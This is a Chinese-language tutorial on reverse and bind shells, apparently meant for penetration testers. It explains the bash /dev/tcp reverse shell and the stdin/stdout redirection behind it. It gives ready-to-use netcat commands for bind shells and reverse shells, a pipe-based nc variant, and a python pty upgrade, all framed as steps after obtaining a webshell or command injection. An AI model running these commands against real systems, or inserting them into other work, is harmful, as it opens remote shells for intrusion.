反弹SHELL

一.基础

1.反弹shell与正向shell

反弹shell

  • 由目标机发起的连接，攻击者被动监听端口
  • 通过用于目标机存在防火墙限制、权限不足、端口占用等问题
  • 常用于目标机在内网，攻击机在外网

正向shell

  • 由攻击机发起的连接，目标机被动监听端口
  • 通常用于目标机无限制
  • 常用于目标机在外网，攻击机在内网

2.反弹shell的原理

  • 以linux下通过bash反弹shell为例

    • 操作
      • 攻击机使用nc监听本地端口1234：nc -nlvp 1234
      • Linux目标机执行：bash -i >& /dev/tcp/攻击机的ip/1234 0>&1(或者2)
    • 原理
      • bash -i:在本地打开一个bash终端
      • /dev/tcp/ip/port:/dev/tcp是linux中的一个特殊设备文件，对这个文件的读写就相当于建立一个socket通信
      • bash -i >& /dev/tcp/ip/port:本地bash的标准输出和标准错误输出重定向到远程开启监听的主机，即在本地输入的命令得到输出的结果（无论对错）都显示在远程开启监听的主机上
      • 0>&1与0>&2:标准输入复制到标准输出与标准错误输出，效果一样，因为此时标准输出(1)和标准错误输出(2)都已经重定向到/dev/tcp/ip/port上了，也就是本地输入由远程监听的主机来输入了

二.反弹shell的使用

以下操作前提：下面的内容都是基于获取目标机webshell后的操作，也可以用于命令注入获得反弹shell；
对于linux下一句话木马获得的webshell提权不好操作，建议使用终端shell
使用python对非标准化的终端进行优化：python -c 'import pty;pty.spawn("/bin/bash")'

1.nc工具

攻击机和目标机都使用nc工具

  • nc（netcat）被誉为网络安全届的’瑞士军刀’
  • nc -h 查看命令帮助信息
    • -n 指定ip，不用dns域名解析，加快速度
    • -l 监听模式，用于入站连接
    • -v 显示详细信息，-vv 更详细
    • -p 本地监听端口号
    • -r 任意指定本地及远程端口
    • -t 以telnet形式交互
    • -e 连接后指定执行的程序,windows使用cmd.exe,Linux使用/bin/bash
  • 正向连接
    • 攻击机主动连接目标机，适用于攻击者在内网，目标机在外网
      1. 目标机上执行监听，将bash发送出去：nc -lvvp 1234 -t -e /bin/bash
      2. 攻击者连接目标机：nc 目标机ip 1234
  • 反向连接
    • 攻击者监听，等待目标机连接
      1. 攻击者监听：nc -nlvp 1234
      2. 目标机连接：nc -e /bin/bash 攻击者ip 1234
    • 如果目标机上nc不支持-e选项（linux中使用管道符）
      1. 攻击机上监听： nc -nlvp 1234
        `nc -nlvp 4321`
      2. 目标机上连接：nc 攻击机ip 1234|/bin/bash|nc 攻击机ip 4321
      3. 然后在攻击机上监听1234的终端执行命令，攻击机监听4321的终端上将会输出目标机的执行结果
